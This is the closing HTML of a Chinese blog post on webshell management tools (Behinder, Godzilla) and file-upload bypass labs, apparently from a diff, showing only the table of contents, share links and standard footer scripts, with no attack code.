class="toc-text">插件市场</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90"><span class="toc-number">1.2.2.10.</span> <span class="toc-text">流量特征分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%B0%E8%9D%8E3-0"><span class="toc-number">1.2.3.</span> <span class="toc-text">冰蝎3.0</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D%EF%BC%9A"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">介绍：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%87%AA%E5%B8%A6shell"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">自带shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E8%A7%A3%E5%AF%86"><span class="toc-number">1.2.3.3.</span> <span class="toc-text">流量解密</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%89%B9%E5%BE%81"><span class="toc-number">1.2.3.4.</span> <span class="toc-text">特征</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">1.2.3.5.</span> <span class="toc-text">1.基本信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.2.3.6.</span> <span class="toc-text">2.命令执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E8%99%9A%E6%8B%9F%E7%BB%88%E7%AB%AF"><span class="toc-number">1.2.3.7.</span> <span class="toc-text">3.虚拟终端</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86"><span class="toc-number">1.2.3.8.</span> <span class="toc-text">4.文件管理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">1.2.3.9.</span> <span class="toc-text">5.内网渗透</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.2.3.10.</span> <span class="toc-text">6.反弹shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-%E7%AE%A1%E7%90%86%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.2.3.11.</span> <span class="toc-text">7.管理数据库</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%93%A5%E6%96%AF%E6%8B%89"><span class="toc-number">1.2.4.</span> <span class="toc-text">哥斯拉</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D%EF%BC%9A-1"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">介绍：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%9F%E8%83%BD%EF%BC%9A"><span class="toc-number">1.2.4.2.</span> <span class="toc-text">功能：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC"><span class="toc-number">1.2.4.3.</span> <span class="toc-text">生成木马</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%A8%E9%A9%AC%E7%9A%84%E5%88%A9%E7%94%A8%E9%80%BB%E8%BE%91"><span class="toc-number">1.2.4.4.</span> <span class="toc-text">木马的利用逻辑</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-number">1.2.4.5.</span> <span class="toc-text">流量分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E5%AE%83%E6%A8%A1%E5%9D%97%E8%AE%B2%E8%A7%A3"><span class="toc-number">1.2.4.6.</span> <span class="toc-text">其它模块讲解</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E6%96%B9%E6%B3%95"><span class="toc-number">1.3.</span> <span class="toc-text">上传方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.3.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-1%EF%BC%88JS%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-number">1.3.2.</span> <span class="toc-text">Less-1（JS绕过）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-2%EF%BC%88%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-number">1.3.3.</span> <span class="toc-text">Less-2（文件类型绕过）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-5%EF%BC%88%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-number">1.3.4.</span> <span class="toc-text">Less-5（大小写绕过）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#-1"><span class="toc-number">1.3.5.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-10"><span class="toc-number">1.3.6.</span> <span class="toc-text">Less-10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-17%EF%BC%88%EF%BC%89"><span class="toc-number">1.3.7.</span> <span class="toc-text">Less-17（）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-1%EF%BC%88JS%E7%BB%95%E8%BF%87%EF%BC%89-1"><span class="toc-number">1.3.8.</span> <span class="toc-text">Less-1（JS绕过）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-2%EF%BC%88%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87%EF%BC%89-1"><span class="toc-number">1.3.9.</span> <span class="toc-text">Less-2（文件类型绕过）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-3%EF%BC%88%E8%B7%B3%E8%BF%87%EF%BC%89"><span class="toc-number">1.3.10.</span> <span class="toc-text">Less-3（跳过）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-4%EF%BC%88-htaccess%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-number">1.3.11.</span> <span class="toc-text">Less-4（.htaccess绕过）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-5%EF%BC%88%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87%EF%BC%89-1"><span class="toc-number">1.3.12.</span> <span class="toc-text">Less-5（大小写绕过）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#-2"><span class="toc-number">1.3.13.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-10-1"><span class="toc-number">1.3.14.</span> <span class="toc-text">Less-10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-11%EF%BC%88%EF%BC%89"><span class="toc-number">1.3.15.</span> <span class="toc-text">Less-11（）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-12%EF%BC%88%EF%BC%89"><span class="toc-number">1.3.16.</span> <span class="toc-text">Less-12（）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-13%EF%BC%88%EF%BC%89"><span class="toc-number">1.3.17.</span> <span class="toc-text">Less-13（）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-14%EF%BC%88%EF%BC%89"><span class="toc-number">1.3.18.</span> <span class="toc-text">Less-14（）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-15%EF%BC%88%EF%BC%89"><span class="toc-number">1.3.19.</span> <span class="toc-text">Less-15（）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-16%EF%BC%88%EF%BC%89"><span class="toc-number">1.3.20.</span> <span class="toc-text">Less-16（）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-17%EF%BC%88%EF%BC%89-1"><span class="toc-number">1.3.21.</span> <span class="toc-text">Less-17（）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-18%EF%BC%88%EF%BC%89"><span class="toc-number">1.3.22.</span> <span class="toc-text">Less-18（）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-19%EF%BC%88%EF%BC%89"><span class="toc-number">1.3.23.</span> <span class="toc-text">Less-19（）</span></a></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%BA%8C%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9Awebshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%EF%BC%89/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%BA%8C%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9Awebshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%EF%BC%89/&text=day6-webshell详解二（下午：webshell管理工具）"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%BA%8C%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9Awebshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%EF%BC%89/&title=day6-webshell详解二（下午：webshell管理工具）"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%BA%8C%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9Awebshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%EF%BC%89/&is_video=false&description=day6-webshell详解二（下午：webshell管理工具）"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=day6-webshell详解二（下午：webshell管理工具）&body=Check out this article: https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%BA%8C%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9Awebshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%EF%BC%89/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%BA%8C%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9Awebshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%EF%BC%89/&title=day6-webshell详解二（下午：webshell管理工具）"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%BA%8C%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9Awebshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%EF%BC%89/&title=day6-webshell详解二（下午：webshell管理工具）"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%BA%8C%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9Awebshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%EF%BC%89/&title=day6-webshell详解二（下午：webshell管理工具）"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%BA%8C%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9Awebshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%EF%BC%89/&title=day6-webshell详解二（下午：webshell管理工具）"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%BA%8C%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9Awebshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%EF%BC%89/&name=day6-webshell详解二（下午：webshell管理工具）&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%BA%8C%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9Awebshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%EF%BC%89/&t=day6-webshell详解二（下午：webshell管理工具）"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+    <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2019-2023
+        Garck3h
+    </div>
+    <div class="footer-right">
+        <nav>
+
+            <ul>
+                
+                    <!-- 不蒜子统计 -->
+                    <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+
+                    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+
+
+        </nav>
+    </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
